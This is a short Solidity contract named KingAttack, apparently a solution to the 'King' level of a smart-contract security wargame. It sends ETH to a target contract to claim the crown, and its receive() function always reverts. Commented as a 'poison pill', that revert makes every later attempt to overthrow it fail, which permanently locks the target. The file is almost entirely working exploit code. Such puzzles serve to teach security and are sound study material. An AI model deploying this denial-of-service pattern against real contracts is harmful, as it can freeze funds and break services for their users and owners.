// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract KingAttack {
    function attack(address payable target) external payable {
        // Send our ETH to King.receive() with enough value to claim the crown.
        (bool success,) = target.call{value: msg.value}("");
        require(success, "Failed to claim kingship");
    }

    // The poison pill:
    // When someone tries to overthrow us, King contract calls payable(king).transfer(msg.value)
    // This receive function reverts, causing the whole transaction to fail and roll back!
    receive() external payable {
        revert("I am King forever! Nobody can overthrow me!");
    }
}
